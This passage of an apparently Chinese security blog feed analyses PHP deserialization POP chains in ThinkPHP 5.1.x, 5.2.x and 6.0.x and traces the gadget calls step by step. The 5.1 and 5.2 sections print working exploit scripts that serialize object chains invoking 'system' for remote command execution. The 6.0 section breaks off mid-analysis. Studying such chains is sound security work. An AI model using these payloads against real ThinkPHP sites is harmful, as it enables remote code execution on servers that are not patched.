class="string">'REDIRECT_PATH_INFO'</span>, <span class="string">'REDIRECT_URL'</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">'default_filter'</span>   =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">'url_domain_root'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">'https_agent_name'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">'http_agent_ip'</span>    =&gt; <span class="string">'HTTP_X_REAL_IP'</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">'url_html_suffix'</span>  =&gt; <span class="string">'html'</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure>

<p>当时跟着pop链写了一下，始终不太行，最后发现conversion是trait声明的orz,，所以先去声明model类中再去继承就可以了。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://paper.seebug.org/1040/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1040/#_1</a></p>
<p><a href="https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/" target="_blank" rel="noopener">https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp 5.2.x pop链分析</title>
    <url>/2019/10/08/Thinkphp-5-2-x-pop%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>紧接着第一篇5.1.x的pop链分析，接下来分析第二篇5.2.x的pop链</p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p><img src="https://s2.ax1x.com/2019/10/08/ufH5Se.png" alt="ufH5Se.png"></p>
<h3 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h3><p>Thinkphp5.2和Thinkphp5.1的区别是：</p>
<p>在tp5.1中我们可以触发Request类中的__call方法进而触发call_user_func_array调用input方法，进而调用filtervalue，配合自己设置的$this-&gt;filter进行call_user_func 实现 RCE.</p>
<p>那么在Thinkphp5.2中Request类是被删除掉了，所以后面的链是不可用的，不过前面到file_exits触发__toString还是可以用的，那么前面的就file_exists之前就不再详细分析了，主要分析下触发__toString后的调用流程</p>
<p>在thinkphp5.1中是通过visiable函数去触发__call,那么Request类中的__call被删了，自然这个触发点也就没作用了，所以接下来寻找新的触发点</p>
<p><strong>同样在toArray()函数中</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">        <span class="comment">// 关联模型对象</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">            $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">            $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关联模型对象</span></span><br><span class="line">        $item[$key] = $val-&gt;toArray();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>触发点在getAttr()函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">            $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br></pre></td></tr></table></figure>

<p><strong>跟进getAttr()函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $relation = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $relation = <span class="keyword">true</span>;</span><br><span class="line">        $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进getValue()函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function">...</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">(isset<span class="params">($this-&gt;withAttr[$fieldName])</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">       $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName];</span><br><span class="line">       $value   = $closure($value, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>漏洞触发点如下</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$value   = $closure($value, <span class="keyword">$this</span>-&gt;data);</span><br></pre></td></tr></table></figure>

<p>回推$value，$closure，$this-&gt;data</p>
<p><strong>先看一下$value</strong></p>
<p>我们这里并没有设置$relation，所以这里$value的值是从参数传进来的，回推到getAttr函数，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $relation = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $relation = <span class="keyword">true</span>;</span><br><span class="line">        $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到$value= $this-&gt;getData($name),跟进getData函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>为了更清晰的解释，我们可以先看看这个$name传进来的到底是什么，关键代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">        <span class="comment">// 关联模型对象</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">            $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">            $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关联模型对象</span></span><br><span class="line">        $item[$key] = $val-&gt;toArray();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到我们这里先通过了arrar_merge函数将$this-&gt;data与$this-&gt;relation，但是$this-&gt;relation没赋值的情况下，$data就是$this-&gt;data,所以可以看出传入getAttr函数中的参数是data数组中的键值</p>
<p>接着getData</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>$name非空，进入getRealFieldName函数，跟进</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span><span class="params">(string $name)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;strict ? $name : App::parseName($name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>去看一下$this-&gt;strict的值，在Attribute.php中第86行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> $strict = <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure>

<p>那么就意味着$fieldName也是我们$name数组的key,紧接着</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];</span><br></pre></td></tr></table></figure>

<p>这样就返回了我们$name数组键对应的值,也就是$value。</p>
<p>在getAttr函数中我们可以看到通过getData返回的值作为$value传给了getValue函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> ...</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样我们就确定了漏洞触发点$value   = $closure($value, $this-&gt;data);中$value的值。</p>
<p>接着去看一下$closure的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName];</span><br></pre></td></tr></table></figure>

<p>我们可以自己控制withAttr这个数组，那么接着去看一下$fieldName的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br></pre></td></tr></table></figure>

<p>和之前的一样，$name的值也是我们自己控制的，是data数组的键值，那么$closure的值也找到了，就是withAttr数组中的值</p>
<p>再看一下$this-&gt;data,我们可以自己设置</p>
<p>最终形式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span><span class="params">(param,array<span class="params">()</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>利用方式如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>();</span><br><span class="line">system(<span class="string">'whoami'</span>,$a);</span><br></pre></td></tr></table></figure>

<p>回显结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">root@iZuf6420mwa64xegn82ysrZ:~<span class="comment"># php test.php</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>那么exp就比较好写了，魔改了一下tp5.1的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $files;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $data=<span class="keyword">array</span>(<span class="string">"pwn"</span> =&gt; <span class="string">"calc.exe"</span>);</span><br><span class="line">        <span class="keyword">private</span> $withAttr = <span class="keyword">array</span>(<span class="string">"pwn"</span> =&gt; <span class="string">"system"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line">$Conver = <span class="keyword">new</span> Windows();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($Conver));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>调用栈</p>
<p><img src="https://s2.ax1x.com/2019/10/08/uhQgxK.png" alt="uhQgxK.png"></p>
<p><img src="https://s2.ax1x.com/2019/10/08/uh3ibF.png" alt="uh3ibF.png"></p>
<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p><a href="https://www.anquanke.com/post/id/187819" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187819</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp 6.0.x pop链分析</title>
    <url>/2019/10/09/Thinkphp-6-0-x-pop%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>接着上次的来分析一下Thinkphp6.0.x的pop链</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think&#x3D;6.0.x-dev v6.0</span><br></pre></td></tr></table></figure>

<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p><img src="https://s2.ax1x.com/2019/10/08/uhhITU.png" alt="uhhITU.png"></p>
<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>从5.1看到6.0发现Thinkphp的改变还是有点大的，在5.2中因为删掉了Request类中的__call方法导致后面的链需要重新寻找，而6.0的链还可以继续用5.2.x __toString后面的链，但是由于Thinkphp6.0删掉了Windows类，所以原来的Windows-&gt;__destruct()触发点没了，需要重新找到一个合适的触发点。</p>
<p><strong>新的触发点位于Model.php类中的__destruct</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>将$this-&gt;lazySave设置为True，进入save()函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $data = [], string $sequence = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 数据对象赋值</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setAttrs($data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p><strong>这里我们要进入updataData函数，所以要考虑一下前面几个条件的满足情况</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟着isEmpty()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要$this-&gt;data为一个非空数组这样就满足返回是false了，接着跟进trigger</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(string $event)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>控制$this-&gt;withEvent为False就可以了</p>
<p>再回到save函数中看一下，我们前面的函数都满足了，最后再设$this-&gt;exists为true就可以进入updateData函数了，跟进</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 事件回调</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeUpdate'</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;checkData();</span><br><span class="line">    <span class="comment">// 获取有更新的数据</span></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">        <span class="comment">// 关联更新</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autoRelationUpdate();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line">        $allowFields = <span class="keyword">$this</span>-&gt;checkAllowFields();</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p><strong>下面这部分代码已经满足了，直接往下走</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeUpdate'</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进checkData()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkData</span><span class="params">()</span>: <span class="title">void</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>似乎没影响，接着跟进getChangedData()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;force ? <span class="keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> <span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">empty</span>($a) || <span class="keyword">empty</span>($b)) &amp;&amp; $a !== $b) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> is_object($a) || $a != $b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只读字段不允许更新</span></span><br><span class="line">....</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以设置$this-&gt;force为true，这样返回的就是我们设置的非空data数组了</p>
<p><strong>最终进入checkAllowFields()函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测字段</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $query = <span class="keyword">$this</span>-&gt;db();</span><br><span class="line">            $table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br></pre></td></tr></table></figure>

<p>通过设置$this-&gt;field为空，$this-&gt;schema为空进入__toString触发点db()函数</p>
